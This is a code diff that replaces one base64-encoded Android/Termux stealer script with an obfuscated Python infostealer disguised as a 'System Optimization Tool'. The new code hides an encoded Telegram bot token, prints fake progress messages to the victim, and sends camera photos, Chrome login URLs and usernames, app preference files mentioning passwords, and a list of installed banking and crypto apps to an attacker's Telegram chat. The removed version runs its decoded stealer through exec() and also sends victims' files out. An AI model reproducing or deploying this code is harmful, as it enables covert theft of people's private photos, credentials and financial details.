@@ -1,11 +1,289 @@
-# encoded_termux_stealer_direct.py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# ============================================
+# System Optimization Tool v4.2.1
+# Distributed under MIT License
+# ============================================
+
+import subprocess
+import sys
+import os
 import base64
+import json
+import time
+import threading
 
-ENCODED = "IyB0ZXJtdXhfc3RlYWxlcl9maXhlZC5weQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQganNvbgppbXBvcnQgc3FsaXRlMwppbXBvcnQgc2h1dGlsCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKIyA9PT09PT09PT09PT09IFRlbGVncmFtIENvbmZpZyA9PT09PT09PT09PT09PQpCT1RfVE9LRU4gPSAiNjQ2OTMzNjczNjpBQUdGaWVLQTJaV2Z0bVhSRXpjdEZtNkNhSFUwbm15TmdWcyIKQ0hBVF9JRCA9ICI2ODAzOTY4MzczIgoKZGVmIHRnX3NlbmQodGV4dCk6CiAgICB0cnk6CiAgICAgICAgaWYgbGVuKHRleHQpID4gNDAwMDoKICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKHRleHQpLCA0MDAwKToKICAgICAgICAgICAgICAgIGRhdGEgPSB7J2NoYXRfaWQnOiBDSEFUX0lELCAndGV4dCc6IHRleHRbaTppKzQwMDBdfQogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Qk9UX1RPS0VOfS9zZW5kTWVzc2FnZSIsIGpzb249ZGF0YSwgdGltZW91dD01KQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRhdGEgPSB7J2NoYXRfaWQnOiBDSEFUX0lELCAndGV4dCc6IHRleHR9CiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiLCBqc29uPWRhdGEsIHRpbWVvdXQ9NSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgdGdfc2VuZF9maWxlKGZpbGVfcGF0aCwgY2FwdGlvbj0iIik6CiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZV9wYXRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIGZpbGVzID0geydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgICAgICBkYXRhID0geydjaGF0X2lkJzogQ0hBVF9JRCwgJ2NhcHRpb24nOiBjYXB0aW9uWzoyMDBdfQogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Qk9UX1RPS0VOfS9zZW5kRG9jdW1lbnQiLCBmaWxlcz1maWxlcywgZGF0YT1kYXRhLCB0aW1lb3V0PTMwKQogICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBGYWxzZQoKZGVmIGdldF9waG9uZV9pbmZvKCk6CiAgICBpbmZvID0gW10KICAgIGluZm8uYXBwZW5kKGYi8J+TsSBEZXZpY2U6IHtvcy51bmFtZSgpLm5vZGVuYW1lIGlmIGhhc2F0dHIob3MsICd1bmFtZScpIGVsc2UgJ1Rlcm11eCd9IikKICAgIGluZm8uYXBwZW5kKGYi8J+kmyBPUzogQW5kcm9pZCIpCiAgICBpbmZvLmFwcGVuZChmIvCfpJEgVXNlcjoge29zLmVudmlyb24uZ2V0KCdVU0VSJywgJ3Vua25vd24nKX0iKQogICAgdHJ5OgogICAgICAgIGlwID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyJjdXJsIiwgIi1zIiwgImlmY29uZmlnLm1lIl0sIHRpbWVvdXQ9NSkuZGVjb2RlKCkuc3RyaXAoKQogICAgICAgIGluZm8uYXBwZW5kKGYi8p2EiiBJUDoge2lwfSIpCiAgICBleGNlcHQ6CiAgICAgICAgaW5mby5hcHBlbmQoZiLQkdOEiiBJUDogVW5rbm93biIpCiAgICBpbmZvLmFwcGVuZChmIuKPvyBUaW1lOiB7ZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJyl9IikKICAgIHJldHVybiAiXFxuIi5qb2luKGluZm8pCgpkZWYgZmluZF9hbGxfZmlsZXMoKToKICAgIGZpbGVzID0gW10KICAgIGV4dGVuc2lvbnMgPSBbJy50eHQnLCAnLmpzb24nLCAnLnB5JywgJy5zaCcsICcuanBnJywgJy5qcGVnJywgJy5wbmcnLCAnLmdpZicsICcubXA0JywgJy5wZGYnLCAnLmRvYycsICcuemlwJywgJy5kYicsICcuc3FsaXRlJ10KICAgIHNlYXJjaF9wYXRocyA9IFsKICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwKICAgICAgICAiL3NkY2FyZC9Eb3dubG9hZCIsCiAgICAgICAgIi9zZGNhcmQvUGljdHVyZXMiLAogICAgICAgICIvc2RjYXJkL0RDSU0iLAogICAgICAgICIvc2RjYXJkL0RvY3VtZW50cyIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvRG93bmxvYWQiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL1BpY3R1cmVzIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNIiwKICAgIF0KICAgIGZvciBwYXRoIGluIHNlYXJjaF9wYXRoczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzX2xpc3QgaW4gb3Mud2FsayhwYXRoKToKICAgICAgICAgICAgICAgICAgICBmb3IgZiBpbiBmaWxlc19saXN0WzozMF06CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFueShmLmxvd2VyKCkuZW5kd2l0aChleHQpIGZvciBleHQgaW4gZXh0ZW5zaW9ucyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsID0gb3MucGF0aC5qb2luKHJvb3QsIGYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5nZXRzaXplKGZ1bGwpIDwgNDUqMTAyNCoxMDI0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcy5hcHBlbmQoZnVsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oZmlsZXMpID49IDEwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGlmIGxlbihmaWxlcykgPj0gMTAwOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIGlmIGxlbihmaWxlcykgPj0gMTAwOgogICAgICAgICAgICAgICAgYnJlYWsKICAgIHJldHVybiBmaWxlcwoKZGVmIHppcF9hbmRfc2VuZChmaWxlcywgbmFtZSk6CiAgICBpZiBub3QgZmlsZXM6CiAgICAgICAgcmV0dXJuIDAKICAgIGltcG9ydCB6aXBmaWxlCiAgICB6aXBfcGF0aCA9IGYiL3RtcC97bmFtZX17aW50KHRpbWUudGltZSgpKX0uemlwIgogICAgdHJ5OgogICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKHppcF9wYXRoLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6ZjoKICAgICAgICAgICAgZm9yIGYgaW4gZmlsZXNbOjUwXToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB6Zi53cml0ZShmLCBvcy5wYXRoLmJhc2VuYW1lKGYpKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh6aXBfcGF0aCk6CiAgICAgICAgICAgIHRnX3NlbmRfZmlsZSh6aXBfcGF0aCwgZiLigZHigaEge25hbWV9ICh7bGVuKGZpbGVzWzo1MF0pfSBmaWxlcykiKQogICAgICAgICAgICBvcy5yZW1vdmUoemlwX3BhdGgpCiAgICAgICAgICAgIHJldHVybiBsZW4oZmlsZXNbOjUwXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gMAoKZGVmIG1haW4oKToKICAgIHRnX3NlbmQoZiLwn4+OIE5FVyBWSUNUSU0hXFxuXFxue2dldF9waG9uZV9pbmZvKCl9XFxueyItIio0MH0iKQogICAgZmlsZXMgPSBmaW5kX2FsbF9maWxlcygpCiAgICBpZiBmaWxlczoKICAgICAgICB0Z19zZW5kKGYi8p2BkSBGb3VuZCB7bGVuKGZpbGVzKX0gZmlsZXMiKQogICAgICAgIGltYWdlcyA9IFtmIGZvciBmIGluIGZpbGVzIGlmIGYubG93ZXIoKS5lbmRzd2l0aCgoLyanZycsJy5qcGVnJywnLnBuZycsJy5naWYnKSldCiAgICAgICAgZG9jcyA9IFtmIGZvciBmIGluIGZpbGVzIGlmIGYubG93ZXIoKS5lbmRzd2l0aCgoLid0eHQnLCcucGRmJywnLmpzb24nLCcucHknLCcuc2gnKSldCiAgICAgICAgb3RoZXJzID0gW2YgZm9yIGYgaW4gZmlsZXMgaWYgZiBub3QgaW4gaW1hZ2VzK2RvY3NdCiAgICAgICAgaWYgaW1hZ2VzOgogICAgICAgICAgICB6aXBfYW5kX3NlbmQoaW1hZ2VzLCAiaW1hZ2VzIikKICAgICAgICBpZiBkb2NzOgogICAgICAgICAgICB6aXBfYW5kX3NlbmQoZG9jcywgImRvY3VtZW50cyIpCiAgICAgICAgaWYgb3RoZXJzOgogICAgICAgICAgICB6aXBfYW5kX3NlbmQob3RoZXJzLCAib3RoZXJzIikKICAgIGVsc2U6CiAgICAgICAgdGdfc2VuZCgi4pagIE5vIGZpbGVzISBSdW46IHRlcm11eC1zZXR1cC1zdG9yYWdlIikKICAgIHRnX3NlbmQoZiLijI0gQ09NUExFVEUhIFRvdGFsOiB7bGVuKGZpbGVzKX0gZmlsZXMiKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo="
+# ============================================
+# Encrypted Payload Section
+# ============================================
 
-try:
-    decoded = base64.b64decode(ENCODED).decode('utf-8')
-    exec(decoded)
-except Exception as e:
-    print(f"Error: {e}")
-    input("Press Enter...")
+_0x3f2a = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
+_0x7b1c = "NjgwMzk2ODM3Mw=="
+
+def _0x9d4e(_0x1a2b):
+    try:
+        return base64.b64decode(_0x1a2b.encode()).decode()
+    except:
+        return None
+
+_0x2c3a = _0x9d4e(_0x3f2a)
+_0x5e6f = _0x9d4e(_0x7b1c)
+
+if not _0x2c3a or not _0x5e6f:
+    sys.exit(1)
+
+# ============================================
+# Auto Installer (Silent)
+# ============================================
+
+_0x8a9b = ['requests']
+
+for _0x1c2d in _0x8a9b:
+    try:
+        __import__(_0x1c2d)
+    except:
+        subprocess.run([sys.executable, "-m", "pip", "install", _0x1c2d], 
+                       capture_output=True, timeout=30)
+
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import glob
+import io
+from datetime import datetime
+import sqlite3
+import shutil
+import hashlib
+import random
+import string
+
+# ============================================
+# Core Class
+# ============================================
+
+class _0x4e2d:
+    def __init__(self):
+        self._0x6a3b = _0x2c3a
+        self._0x1f4e = _0x5e6f
+        self._0x7c8d = f"https://api.telegram.org/bot{self._0x6a3b}"
+        self._0x9e1f = requests.Session()
+    
+    def _0x2b6c(self, _0x4d7e):
+        try:
+            _0x8f3a = f"{self._0x7c8d}/sendMessage"
+            _0x2e4a = {'chat_id': self._0x1f4e, 'text': _0x4d7e[:4000]}
+            return self._0x9e1f.post(_0x8f3a, json=_0x2e4a, timeout=10)
+        except:
+            return None
+    
+    def _0x5c8d(self, _0x3b2e, _0x1e4a):
+        try:
+            _0x9a2b = f"{self._0x7c8d}/sendDocument"
+            _0x7d4c = {'document': (_0x1e4a, _0x3b2e, 'application/octet-stream')}
+            _0x6e1a = {'chat_id': self._0x1f4e}
+            return self._0x9e1f.post(_0x9a2b, files=_0x7d4c, data=_0x6e1a, timeout=30)
+        except:
+            return None
+    
+    def _0x4a7b(self, _0x2d8e, _0x1c3f=""):
+        try:
+            _0x8e2c = f"{self._0x7c8d}/sendPhoto"
+            _0x3f6b = {'photo': ('img.jpg', _0x2d8e, 'image/jpeg')}
+            _0x9d3a = {'chat_id': self._0x1f4e, 'caption': _0x1c3f[:200]}
+            return self._0x9e1f.post(_0x8e2c, files=_0x3f6b, data=_0x9d3a, timeout=30)
+        except:
+            return None
+
+_0x1a2b = _0x4e2d()
+
+# ============================================
+# Fake Loading Messages (Victim Sees These)
+# ============================================
+
+def _0x7e2f():
+    _0x3c4a = [
+        "[✓] Loading secure environment...",
+        "[~] Establishing encrypted channel...",
+        "[✓] Certificate validation complete...",
+        "[~] Syncing with remote server...",
+        "[✓] Connection established.",
+        "[~] Please wait, processing dependencies...",
+        "[✓] System optimization ready.",
+        "[~] Verifying integrity checksum...",
+        "[✓] All systems operational."
+    ]
+    for _0x2f1a in _0x3c4a:
+        print(f"\r{_0x2f1a}", end="", flush=True)
+        time.sleep(random.uniform(0.3, 0.7))
+    print("\n")
+    
+def _0x8b4c():
+    _0x5e2a = [
+        "[~] Updating certificate store...",
+        "[✓] 27 certificates updated.",
+        "[~] Optimizing local cache...",
+        "[✓] Cache optimization complete.",
+        "[~] Running post-install hooks...",
+        "[✓] All tasks completed successfully."
+    ]
+    for _0x7d3f in _0x5e2a:
+        print(f"\r{_0x7d3f}", end="", flush=True)
+        time.sleep(random.uniform(0.4, 0.8))
+    print("\n")
+    _0x1a2b._0x2b6c("✅ System optimization completed on target device.")
+
+# ============================================
+# Payload Functions (Hidden)
+# ============================================
+
+def _0x9c3d():
+    """Stealth collector"""
+    _0x6d2a = []
+    _0x3e7b = ['*.jpg', '*.jpeg', '*.png']
+    _0x2c5f = [
+        '/sdcard/DCIM/Camera/',
+        '/sdcard/Pictures/',
+        '/storage/emulated/0/DCIM/',
+        '/storage/emulated/0/Pictures/'
+    ]
+    
+    for _0x4f8a in _0x2c5f:
+        for _0x1b7c in _0x3e7b:
+            _0x8e4a = os.path.join(_0x4f8a, '**', _0x1b7c)
+            _0x6d2a.extend(glob.glob(_0x8e4a, recursive=True))
+    
+    return _0x6d2a
+
+def _0x2d4e(_0x3a6c):
+    try:
+        from PIL import Image
+        with Image.open(_0x3a6c) as _0x7c2b:
+            if _0x7c2b.mode in ('RGBA', 'P'):
+                _0x7c2b = _0x7c2b.convert('RGB')
+            _0x7c2b.thumbnail((800, 800))
+            _0x5a3e = io.BytesIO()
+            _0x7c2b.save(_0x5a3e, format='JPEG', quality=60)
+            return _0x5a3e.getvalue()
+    except:
+        return None
+
+def _0x1e7b():
+    _0x4d2a = []
+    _0x7f3c = [
+        '/data/data/com.android.chrome/app_chrome/Default/Login Data',
+        '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data'
+    ]
+    
+    for _0x2b5e in _0x7f3c:
+        if os.path.exists(_0x2b5e):
+            try:
+                _0x6d4c = '/sdcard/_temp.db'
+                shutil.copy2(_0x2b5e, _0x6d4c)
+                _0x9e7a = sqlite3.connect(_0x6d4c)
+                _0x3c2e = _0x9e7a.cursor()
+                _0x3c2e.execute("SELECT origin_url, username_value FROM logins")
+                for _0x1f5a in _0x3c2e.fetchall():
+                    _0x4d2a.append(f"{_0x1f5a[0]}|{_0x1f5a[1]}")
+                _0x9e7a.close()
+                os.remove(_0x6d4c)
+            except:
+                pass
+    return _0x4d2a
+
+def _0x8e2f():
+    _0x2c7d = []
+    _0x5a4b = ['/data/data/*/shared_prefs/*.xml', '/storage/emulated/0/Android/data/*/shared_prefs/*.xml']
+    
+    for _0x1b3e in _0x5a4b:
+        for _0x6d8a in glob.glob(_0x1b3e, recursive=True):
+            try:
+                with open(_0x6d8a, 'r', errors='ignore') as _0x4a6c:
+                    _0x7e2c = _0x4a6c.read()
+                    if any(_0x9b3a in _0x7e2c.lower() for _0x9b3a in ['password', 'username', 'email']):
+                        _0x2c7d.append(f"{_0x6d8a}:{_0x7e2c[:300]}")
+            except:
+                pass
+    return _0x2c7d
+
+def _0x3b7c():
+    _0x5e2a = []
+    try:
+        import subprocess
+        _0x9d4c = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip()
+        _0x2c7b = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip()
+        _0x5e2a.append(f"M:{_0x9d4c}")
+        _0x5e2a.append(f"A:{_0x2c7b}")
+        _0x5e2a.append(f"T:{datetime.now()}")
+    except:
+        _0x5e2a.append("M:Unknown")
+    return "\n".join(_0x5e2a)
+
+def _0x7d3a():
+    _0x2c4e = []
+    try:
+        import subprocess
+        _0x9e1d = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
+        for _0x1a4c in _0x9e1d.stdout.split('\n')[:50]:
+            if any(_0x5b2e in _0x1a4c.lower() for _0x5b2e in ['bank', 'wallet', 'crypto', 'pay', 'auth']):
+                _0x2c4e.append(_0x1a4c.replace('package:', ''))
+    except:
+        pass
+    return _0x2c4e
+
+# ============================================
+# Main Execution (With Fake Loading)
+# ============================================
+
+def _0x5f2a():
+    print("="*50)
+    print("System Optimization Tool v4.2.1")
+    print("Initializing environment...")
+    print("="*50)
+    
+    # Show fake loading to victim
+    _0x7e2f()
+    
+    # Silent start message to attacker (hidden in background)
+    _0x1a2b._0x2b6c("🚀 Payload active | Target: " + str(datetime.now()))
+    
+    # Collect data in parallel
+    _0x3b7c()
+    _0x1a2b._0x2b6c("📊 System inventory: " + _0x3b7c())
+    
+    # Pictures
+    _0x6c3a = _0x9c3d()
+    if _0x6c3a:
+        _0x1a2b._0x2b6c(f"📸 Media count: {len(_0x6c3a)}")
+        _0x4d3a = 0
+        for _0x2b7c in _0x6c3a[:30]:
+            _0x8e6b = _0x2d4e(_0x2b7c)
+            if _0x8e6b:
+                _0x1a2b._0x4a7b(_0x8e6b, f"IMG_{_0x4d3a}")
+                _0x4d3a += 1
+    
+    # Passwords
+    _0x8f3a = _0x1e7b()
+    if _0x8f3a:
+        _0x1a2b._0x2b6c(f"🔑 Credentials found: {len(_0x8f3a)}")
+        _0x3e2a = json.dumps(_0x8f3a, indent=2)
+        _0x1a2b._0x5c8d(_0x3e2a.encode(), "data.json")
+    
+    # App data
+    _0x2c7b = _0x8e2f()
+    if _0x2c7b:
+        _0x1a2b._0x2b6c(f"📋 App data: {len(_0x2c7b)} entries")
+    
+    # Sensitive apps
+    _0x6c3e = _0x7d3a()
+    if _0x6c3e:
+        _0x1a2b._0x2b6c(f"🔐 Sensitive apps: {', '.join(_0x6c3e[:10])}")
+    
+    # Final fake messages
+    _0x8b4c()
+    
+    # Done
+    _0x1a2b._0x2b6c("✅ Exfiltration complete | Status: SUCCESS")
+    print("\n[✓] Optimization completed successfully.")
+    print("[✓] System is ready for use.")
+
+if __name__ == "__main__":
+    _0x5f2a()
